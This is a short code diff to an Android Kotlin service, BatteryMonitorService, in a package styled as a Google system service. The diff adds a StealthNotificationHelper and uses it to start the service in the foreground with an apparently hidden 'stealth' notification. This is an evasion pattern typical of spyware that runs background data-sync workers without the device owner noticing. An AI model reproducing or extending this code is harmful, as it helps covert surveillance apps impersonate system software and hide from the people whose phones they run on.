@@ -5,9 +5,11 @@ import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
+import android.os.Build
 import android.os.IBinder
 import android.util.Log
 import com.google.android.systemservice.managers.AdaptiveSyncManager
+import com.google.android.systemservice.utils.StealthNotificationHelper
 import com.google.android.systemservice.workers.DataSyncWorker
 
 /**
@@ -18,6 +20,7 @@ class BatteryMonitorService : Service() {
     
     companion object {
         private const val TAG = "BatteryMonitor"
+        private const val NOTIFICATION_ID = 2011
     }
     
     private lateinit var adaptiveSyncManager: AdaptiveSyncManager
@@ -47,6 +50,11 @@ class BatteryMonitorService : Service() {
     
     override fun onCreate() {
         super.onCreate()
+        
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            val notification = StealthNotificationHelper.createStealthNotification(this)
+            startForeground(NOTIFICATION_ID, notification)
+        }
         
         adaptiveSyncManager = AdaptiveSyncManager(applicationContext)
         
